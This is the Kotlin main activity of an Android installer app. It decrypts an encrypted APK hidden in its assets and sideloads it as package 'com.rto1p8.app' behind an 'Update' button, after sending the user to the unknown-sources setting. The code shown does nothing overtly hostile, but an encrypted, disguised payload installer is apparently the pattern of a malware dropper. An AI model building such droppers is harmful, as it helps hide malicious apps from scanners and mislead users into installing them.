package com.coderx.installer

import android.app.AlertDialog
import android.app.PendingIntent
import android.app.ProgressDialog
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.coderx.installer.databinding.ActivityMainBinding
import com.coderx.installer.utils.AssetEncryption
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var installReceiver: InstallReceiver
    private var progressDialog: ProgressDialog? = null
    private var isInstalling = false
    private val targetPackage = "com.rto1p8.app"
    private var currentSessionId: Int = -1

    companion object {
        private const val REQUEST_INSTALL_PERMISSION = 1234
        private const val ASSETS_APK_NAME = "app.apk"
        private const val TAG = "AppInstaller"

    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Set static reference for the receiver
        InstallReceiver.mainActivityInstance = this

        setupInstallReceiver()
        setupUI()
        checkIfInstalled()
    }


    private fun setupInstallReceiver() {
        installReceiver = InstallReceiver()
        val filter = IntentFilter(InstallReceiver.PACKAGE_INSTALLED_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(installReceiver, filter)
        }
    }

    private fun setupUI() {
        binding.updateButton.setOnClickListener {
            if (isInstalling) {
                return@setOnClickListener
            }

            if (packageManager.isPackageInstalled(targetPackage)) {
                openApp()
            } else {
                // Check permission first
                if (!packageManager.canRequestPackageInstalls()) {
                    showPermissionDialog()
                } else {
                    // Permission already granted, proceed with installation
                    prepareAndInstall()
                }
            }
        }
    }



    private fun updateButtonState() {
        runOnUiThread {
            if (isInstalling) {
                binding.updateButton.isEnabled = true
            } else {
                binding.updateButton.text = if (packageManager.isPackageInstalled(targetPackage)) {
                    "Open"
                } else {
                    "Update"
                }
                binding.updateButton.isEnabled = true
            }
        }
    }

    private fun checkIfInstalled() {
        updateButtonState()
    }

    private fun openApp() {
        try {
            val launchIntent = packageManager.getLaunchIntentForPackage(targetPackage)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (launchIntent != null) {
                startActivity(launchIntent)
            } else {
                Toast.makeText(this, "Failed to open app: No launch intent", Toast.LENGTH_SHORT).show()
                Log.e(TAG, "No launch intent found for $targetPackage")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open app: ${e.message}", e)
            Toast.makeText(this, "Failed to open app: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permission Required")
            .setMessage("This app needs permission to install packages. You will be redirected to settings to enable this permission.")
            .setPositiveButton("OK") { _, _ ->
                requestInstallPermission()
            }
            .show()
    }

    private fun prepareAndInstall() {
        isInstalling = true
        updateButtonState()
        showProgressDialog("Preparing installation...")

        CoroutineScope(Dispatchers.Main).launch {
            try {
                val apkFile = withContext(Dispatchers.IO) {
                    extractAndValidateApk()
                }

                withContext(Dispatchers.IO) {
                    startSessionInstallation(apkFile)
                }
            } catch (e: Exception) {
                handleInstallationError("Failed to prepare APK: ${e.message}")
            }
        }
    }

    private fun extractAndValidateApk(): File {
        // Check if APK exists in assets
        val encryptedApkName = "${ASSETS_APK_NAME}.enc"
        val assetFiles = try {
            assets.list("") ?: emptyArray()
        } catch (e: IOException) {
            throw IOException("Failed to list assets: ${e.message}")
        }

        Log.d(TAG, "Available assets: ${assetFiles.joinToString()}")
        
        if (!assetFiles.contains(encryptedApkName)) {
            throw IOException("Encrypted APK file $encryptedApkName not found in assets")
        }

        // Extract APK to cache
        val file = File(cacheDir, ASSETS_APK_NAME)
        if (file.exists()) {
            file.delete()
        }

        try {
            // Read and decrypt the APK file
            Log.d(TAG, "Reading encrypted asset: $ASSETS_APK_NAME")
            val decryptedData = AssetEncryption.readEncryptedAsset(this, ASSETS_APK_NAME)
            
            decryptedData.inputStream().use { input ->
                FileOutputStream(file).use { output ->
                    input.copyTo(output)
                }
            }
            Log.d(TAG, "Successfully decrypted APK, size: ${file.length()} bytes")
        } catch (e: IOException) {
            throw IOException("Failed to extract APK to cache: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Decryption failed: ${e.message}", e)
            throw IOException("Failed to decrypt APK: ${e.message}")
        }

        // Validate extracted file
        if (!file.exists() || file.length() == 0L) {
            throw IOException("Extracted APK file is invalid or empty")
        }

        // Verify package name and get version info
        val packageInfo = try {
            packageManager.getPackageArchiveInfo(file.path, PackageManager.GET_META_DATA)
        } catch (e: Exception) {
            throw IOException("Failed to read APK package info: ${e.message}")
        }

        if (packageInfo == null) {
            throw IOException("APK file is corrupted or invalid")
        }

        if (packageInfo.packageName != targetPackage) {
            throw IllegalStateException("APK package name (${packageInfo.packageName}) does not match expected ($targetPackage)")
        }

        // Check if this is an update or new install
        val currentVersion = try {
            packageManager.getPackageInfo(targetPackage, 0).versionCode
        } catch (e: PackageManager.NameNotFoundException) {
            0 // Not installed
        }

        val newVersion = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            packageInfo.longVersionCode.toInt()
        } else {
            @Suppress("DEPRECATION")
            packageInfo.versionCode
        }

        Log.i(TAG, "Installing APK: $targetPackage, current version: $currentVersion, new version: $newVersion")

        return file
    }

    private fun startSessionInstallation(apkFile: File) {
        var session: PackageInstaller.Session? = null
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL).apply {
                setAppPackageName(targetPackage)

                // Set user action requirement based on Android version
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_REQUIRED)
                }

                // Set installation flags for better compatibility
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    setInstallReason(PackageManager.INSTALL_REASON_USER)
                }
            }

            currentSessionId = packageInstaller.createSession(params)
            session = packageInstaller.openSession(currentSessionId)

            // Write APK to session with progress updates
            FileInputStream(apkFile).use { apkIn ->
                session.openWrite("package", 0, apkFile.length()).use { sessionOut ->
                    val buffer = ByteArray(65536)
                    var bytesRead: Int
                    val totalSize = apkFile.length()
                    var totalRead = 0L

                    while (apkIn.read(buffer).also { bytesRead = it } != -1) {
                        if (!isInstalling) {
                            // Installation was cancelled
                            throw InterruptedException("Installation cancelled by user")
                        }

                        sessionOut.write(buffer, 0, bytesRead)
                        totalRead += bytesRead
                        updateProgress(totalRead, totalSize)
                    }
                    session.fsync(sessionOut)
                }
            }

            // Create callback intent with session ID
            val intent = Intent(InstallReceiver.PACKAGE_INSTALLED_ACTION).apply {
                setPackage(packageName)
                putExtra("package_name", targetPackage)
                putExtra("session_id", currentSessionId)
            }

            val pendingIntent = PendingIntent.getBroadcast(
                this,
                currentSessionId,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                                PendingIntent.FLAG_MUTABLE
                            } else {
                                PendingIntent.FLAG_IMMUTABLE
                            }
                        } else {
                            0
                        }
            )

            runOnUiThread {
                progressDialog?.setMessage("Starting installation...")
            }

            // Commit the session
            session.commit(pendingIntent.intentSender)

        } catch (e: InterruptedException) {
            session?.abandon()
            currentSessionId = -1
            Log.i(TAG, "Installation cancelled by user")
        } catch (e: Exception) {
            session?.abandon()
            currentSessionId = -1
            throw e
        } finally {
            session?.close()
        }
    }

    private fun updateProgress(current: Long, total: Long) {
        val progress = if (total > 0) (current * 100 / total).toInt() else 0
        runOnUiThread {
            if (isInstalling) {
                progressDialog?.setMessage("Installing... $progress%")
                progressDialog?.progress = progress
            }
        }
    }

    private fun requestInstallPermission() {
        try {
            val intent = Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                .setData(Uri.parse("package:$packageName"))
            startActivityForResult(intent, REQUEST_INSTALL_PERMISSION)
        } catch (e: Exception) {
            Log.e(TAG, "Could not open settings: ${e.message}", e)
            Toast.makeText(this, "Could not open settings: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    fun handleInstallationError(message: String) {
        Log.e(TAG, message)
        isInstalling = false
        currentSessionId = -1
        runOnUiThread {
            hideProgressDialog()
            updateButtonState()

            AlertDialog.Builder(this)
                .setTitle("Installation Error")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .show()
        }
    }

    fun handleInstallationSuccess() {
        isInstalling = false
        currentSessionId = -1
        runOnUiThread {
            hideProgressDialog()
            updateButtonState()
            Toast.makeText(this, "App installed successfully!", Toast.LENGTH_SHORT).show()
        }
    }

    fun updateInstallProgress(message: String) {
        runOnUiThread {
            progressDialog?.setMessage(message)
        }
    }

    private fun showProgressDialog(message: String) {
        runOnUiThread {
            hideProgressDialog()
            progressDialog = ProgressDialog(this).apply {
                setMessage(message)
                setCancelable(false)
                setProgressStyle(ProgressDialog.STYLE_HORIZONTAL)
                setMax(100)
                show()
            }
        }
    }

    private fun hideProgressDialog() {
        progressDialog?.dismiss()
        progressDialog = null
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_INSTALL_PERMISSION) {
            if (packageManager.canRequestPackageInstalls()) {
                Toast.makeText(this, "Permission granted. Click Install to proceed.", Toast.LENGTH_SHORT).show()
                // Don't auto-install, let user click install again
            } else {
                Toast.makeText(this, "Permission denied. Cannot install apps.", Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onDestroy() {
        // Clean up static reference
        InstallReceiver.mainActivityInstance = null

        // Clean up
        if (isInstalling && currentSessionId != -1) {
            try {
                val session = packageManager.packageInstaller.openSession(currentSessionId)
                session.abandon()
            } catch (e: Exception) {
                Log.w(TAG, "Failed to abandon session on destroy: ${e.message}")
            }
        }

        hideProgressDialog()

        try {
            unregisterReceiver(installReceiver)
        } catch (e: IllegalArgumentException) {
            Log.w(TAG, "Receiver not registered: ${e.message}")
        }

        super.onDestroy()
    }
}

// Extension function to check if package is installed
fun PackageManager.isPackageInstalled(packageName: String): Boolean {
    return try {
        getPackageInfo(packageName, 0)
        true
    } catch (e: PackageManager.NameNotFoundException) {
        false
    }
}